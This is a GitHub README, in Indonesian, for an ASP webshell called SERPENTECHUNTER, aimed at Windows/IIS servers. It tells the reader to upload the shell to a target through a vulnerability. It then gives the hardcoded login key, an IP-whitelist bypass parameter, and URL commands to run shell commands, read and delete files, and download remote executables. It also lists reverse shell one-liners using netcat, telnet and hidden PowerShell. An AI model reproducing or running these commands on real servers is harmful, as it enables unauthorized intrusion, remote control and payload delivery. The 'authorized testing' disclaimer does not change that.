## 🐍 SERPENTECHUNTER v1.0 – ASP ULTIMATE WEBSHELL

**WebShell ASP untuk Windows/IIS – Security Testing & Penetration Testing**

[![ASP](https://img.shields.io/badge/ASP-VBScript-blueviolet?style=flat-square&logo=windows)](https://github.com/SerpentSecHunter2006/WEB-SHELL-ASP-)
[![Version](https://img.shields.io/badge/version-1.0-brightgreen?style=flat-square)](https://github.com/SerpentSecHunter2006/WEB-SHELL-ASP-)
[![Developer](https://img.shields.io/badge/Developer-SerpentSecHunter-orange?style=flat-square)](https://github.com/SerpentSecHunter2006)
[![License](https://img.shields.io/badge/License-MIT-red?style=flat-square)](https://github.com/SerpentSecHunter2006/WEB-SHELL-ASP-/blob/main/LICENSE)

---

### 📌 Tentang

**SERPENTECHUNTER v1.0** adalah WebShell ASP (VBScript) yang dirancang untuk **security testing** dan **penetration testing** pada server **Windows/IIS**. Shell ini menggabungkan fitur-fitur dari WebShell ASP seperti **r57 ASP**, **b374k ASP**, dan **AspWebShell**, dengan tambahan fitur modern seperti **bypass komponen**, **wildcard IP whitelist**, dan **multi-method reverse shell**.

> ⚠️ **Disclaimer:** Tools ini hanya untuk tujuan edukasi dan pengujian keamanan yang sah (authorized penetration testing). Penggunaan untuk aktivitas ilegal adalah tanggung jawab pengguna sepenuhnya.

---

### 🔥 Fitur Unggulan

| Fitur | Deskripsi |
|-------|-----------|
| **🛡️ Stealth Engine** | Bypass 403/404 dengan spoofing header (`Server`, `X-Powered-By`) dan error handling |
| **🔐 Authentication** | Multi-layer auth (Cookie + IP Whitelist Wildcard/CIDR + GET Parameter) |
| **⚡ Command Execution** | 3 strategi: `WScript.Shell`, `Shell.Application`, `WMI (Win32_Process)` |
| **📁 File Manager Ultimate** | List, Read, Write, Delete, Rename, Chmod (via `attrib`), Search (recursive) |
| **📤 Upload & Download** | Upload via POST form (multipart/form-data), Download local file, Remote Download via HTTP (MSXML2/WinHttp) |
| **🌐 Reverse Shell** | 3 metode sekaligus (PowerShell, Netcat, Telnet) - dijalankan di background |
| **🔍 Port Scanner** | TCP Connect scanner dengan multi-format port support (XMLHTTP + Winsock fallback) |
| **🗄️ Database Client** | Support MSSQL (SQLNCLI11) dan Microsoft Access (Jet OLEDB) |
| **🎨 UI Responsive** | Tampilan blackhat theme yang mobile-friendly |
| **🔑 Wildcard IP** | Support IP whitelist dengan wildcard (`%`) dan CIDR (`/24`) |

---

### 🛡️ Bypass & Stealth

| Fitur | Deskripsi |
|-------|-----------|
| **Stealth Engine** | Menyembunyikan identitas server asli dan menghilangkan error log yang mencurigakan |
| **Command Execution (3 Strategi)** | `WScript.Shell` (.Exec() - paling stabil), `Shell.Application` (.ShellExecute() - fallback), `WMI` (Win32_Process.Create() - paling stealth) |
| **IP Whitelist (Wildcard + CIDR)** | Support wildcard `%` untuk subnet (contoh: `192.168.1.%`) dan CIDR `/24` sampai `/8` |

---

### 🔐 Authentication

| Metode | Deskripsi |
|--------|-----------|
| **Cookie** | `sc_auth` (plaintext AUTH_KEY) |
| **GET Parameter** | `?auth=SERPENTECHUNTER666` |
| **IP Whitelist** | Support wildcard (`%`) dan CIDR (`/24`) |
| **Bypass IP** | `?bypass_ip=1` |

**Ubah AUTH_KEY:**
```vbscript
AUTH_KEY = "YOUR_CUSTOM_KEY_HERE"
```

**Tambah IP Whitelist:**
```vbscript
whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.0/8")
```


---

### 🚀 Cara Penggunaan

#### 1. Upload Shell
Upload file `Shell.asp` ke server target melalui vulnerability (File Upload, RCE, dll) pada server **Windows dengan IIS**.

#### 2. Akses & Login
```
http://target.com/path/Shell.asp?auth=SERPENTECHUNTER666
```
Setelah login, cookie akan tersimpan selama 1 tahun.

#### 3. Parameter & Perintah

| Parameter | Fungsi | Contoh |
|-----------|--------|--------|
| `action=exec` | Execute command | `?action=exec&cmd=whoami` |
| `action=file` | File Manager | `?action=file&cmd=list&target=C:\` |
| `action=reverse` | Reverse Shell | `?action=reverse&ip=1.2.3.4&port=4444` |
| `action=portscan` | Port Scanner | `?action=portscan&host=127.0.0.1&ports=1-100` |
| `action=db` | Database Client | `?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=pass` |
| `action=upload` | Upload File (POST) | `?action=upload&path=C:\temp` (gunakan form) |
| `action=download` | Download File | `?action=download&path=C:\file.txt` |
| `action=remotedownload` | Remote Download | `?action=remotedownload&url=http://x.com/p.exe&savepath=C:\p.exe` |

#### 4. Bypass IP Whitelist
Jika IP Anda tidak terdaftar di whitelist, gunakan:
```
?bypass_ip=1
```


---

### 📁 File Manager

```bash
# List directory
?action=file&cmd=list&target=C:\inetpub\wwwroot

# Read file
?action=file&cmd=read&target=C:\windows\win.ini

# Write file
?action=file&cmd=write&target=C:\inetpub\wwwroot\test.txt&content=HACKED

# Delete file/folder (recursive)
?action=file&cmd=delete&target=C:\inetpub\wwwroot\test.txt

# Rename
?action=file&cmd=rename&target=C:\old.txt&params[new_name]=C:\new.txt

# Search files (recursive)
?action=file&cmd=search&target=C:\inetpub\wwwroot&params[pattern]=config

# Chmod (attrib via cmd)
?action=file&cmd=chmod&target=C:\file.txt&params[perms]=+H
```


---

### 🌐 Reverse Shell

Shell ini menjalankan **3 metode reverse shell sekaligus** di background.

**Persiapan Listener (di komputer attacker):**
```bash
# Untuk PowerShell/Netcat
nc -lvnp 4444

# Untuk Telnet (port kedua)
nc -lvnp 4445
```


**Eksekusi Reverse Shell:**
```
?action=reverse&ip=1.2.3.4&port=4444
```


**Metode yang Didukung:**

| Metode | Command | Port |
|--------|---------|------|
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."` | `port` |
| **Netcat** | `nc -e cmd.exe 1.2.3.4 4444` | `port` |
| **Telnet** | `telnet 1.2.3.4 4444 \| cmd \| telnet 1.2.3.4 4445` | `port` & `port+1` |

> ⚡ Semua metode berjalan di background (`WScript.Shell.Run` dengan `0`), sehingga tidak membuat halaman hang!

---

### 🔍 Port Scanner

Support multi-format port input:

```bash
# Range port
?action=portscan&host=127.0.0.1&ports=1-100

# Multiple port
?action=portscan&host=127.0.0.1&ports=22,80,443

# Kombinasi
?action=portscan&host=127.0.0.1&ports=1-100,443,8080
```

**Metode Scanning:**
1. **XMLHTTP** → deteksi port terbuka via HTTP request (cepat)
2. **Winsock (fallback)** → TCP Connect (jika XMLHTTP gagal)


---

### 🗄️ Database Client

Support 2 jenis database di Windows:

**MSSQL (SQL Server):**
```
?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=password
```
Menggunakan provider `SQLNCLI11` (SQL Server Native Client).

**Microsoft Access:**
```
?action=db&dbtype=access&dbserver=C:\database.mdb
```
Menggunakan provider `Microsoft.Jet.OLEDB.4.0`.

---

### ⚙️ Teknologi

| Komponen | Deskripsi |
|----------|-----------|
| **VBScript** | Classic ASP |
| **HTML5 + CSS3** | Responsive UI |
| **IIS** | Microsoft Internet Information Services |
| **Komponen** | `WScript.Shell`, `Shell.Application`, `FileSystemObject`, `ADODB.Stream`, `MSXML2.ServerXMLHTTP`, `WinHttp.WinHttpRequest`, `ADODB.Connection` |

---

### 📊 Kelebihan & Kekurangan

#### ✅ Kelebihan

| No | Kelebihan |
|----|-----------|
| 1 | **Multi-strategy Command Execution** – 3 strategi (WScript.Shell, Shell.Application, WMI) dengan fallback otomatis |
| 2 | **Stealth Engine** – Bypass 403/404 dengan spoofing header dan error handling |
| 3 | **Reverse Shell Multi-Method** – 3 metode sekaligus (PowerShell, Netcat, Telnet) di background |
| 4 | **File Manager Lengkap** – List, Read, Write, Delete, Rename, Chmod, Search (recursive) |
| 5 | **Wildcard IP Whitelist** – Support wildcard (`%`) dan CIDR (`/24`) |
| 6 | **Database Client** – Support MSSQL dan Microsoft Access |
| 7 | **Port Scanner** – Multi-format port support dengan fallback |
| 8 | **UI Responsive** – Mobile-friendly blackhat theme |
| 9 | **Upload & Download** – Local dan remote download dengan fallback |

#### ❌ Kekurangan

| No | Kekurangan |
|----|------------|
| 1 | **Platform Terbatas** – Hanya berjalan di server **Windows/IIS** dengan ASP support |
| 2 | **Tergantung Komponen** – Membutuhkan komponen seperti `WScript.Shell`, `FileSystemObject`, `ADODB.Stream` yang mungkin di-disable oleh admin |
| 3 | **Authentication Sederhana** – Menggunakan plaintext AUTH_KEY di cookie (bukan hash) |
| 4 | **Rentan Deteksi** – Meskipun ada stealth engine, shell tetap bisa terdeteksi oleh AV/EDR modern |
| 5 | **Tidak Ada Persistence** – Harus upload ulang jika server di-restart atau file dihapus |
| 6 | **Koneksi Internet** – Remote download membutuhkan koneksi internet untuk mengunduh payload |

---

### 📝 Changelog

#### v1.0 (02-07-2026)
- ✅ Initial release – ASP Ultimate Webshell
- ✅ Command Execution (3 strategi: WScript.Shell, Shell.Application, WMI)
- ✅ File Manager (List/Read/Write/Delete/Rename/Search/Chmod)
- ✅ Upload & Download (Local + Remote)
- ✅ Reverse Shell (PowerShell + Netcat + Telnet)
- ✅ Port Scanner (XMLHTTP + Winsock fallback)
- ✅ Database Client (MSSQL + Access)
- ✅ IP Whitelist (Wildcard `%` + CIDR `/24`)
- ✅ Stealth Engine (Header Spoofing)
- ✅ UI Responsive & Mobile Friendly
- ✅ Fully functional on Windows/IIS


---

### ⚖️ Lisensi

**MIT License** – Silakan gunakan, modifikasi, dan distribusikan dengan mencantumkan kredit kepada developer.

```
MIT License

Copyright (c) 2026 SerpentSecHunter

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
...
```

---

### 👨‍💻 Developer

**SerpentSecHunter**
- GitHub: [SerpentSecHunter2006](https://github.com/SerpentSecHunter2006)
- Rilis: 02-07-2026

---

### ⭐ Support

Jika Anda menyukai project ini, berikan **star** ⭐ di GitHub dan **fork** untuk mendukung pengembangan lebih lanjut!

---

### ⚠️ Disclaimer

> **Peringatan:** Tools ini dibuat untuk tujuan **edukasi** dan **pengujian keamanan** yang sah (authorized penetration testing). Penggunaan tools ini untuk aktivitas ilegal, hacking tanpa izin, atau merusak sistem orang lain adalah **TINDAKAN PIDANA** dan sepenuhnya menjadi **tanggung jawab pengguna**. Developer tidak bertanggung jawab atas penyalahgunaan tools ini.

---

**🐍 SERPENTECHUNTER v1.0 – "TIDAK ADA YANG GAK BISA!"** 😈

---

### 🔗 Repository Lain
- [WEB-SHELL-ASP (ASP Version)](https://github.com/SerpentSecHunter2006/WEB-SHELL-ASP-) – Repository ini
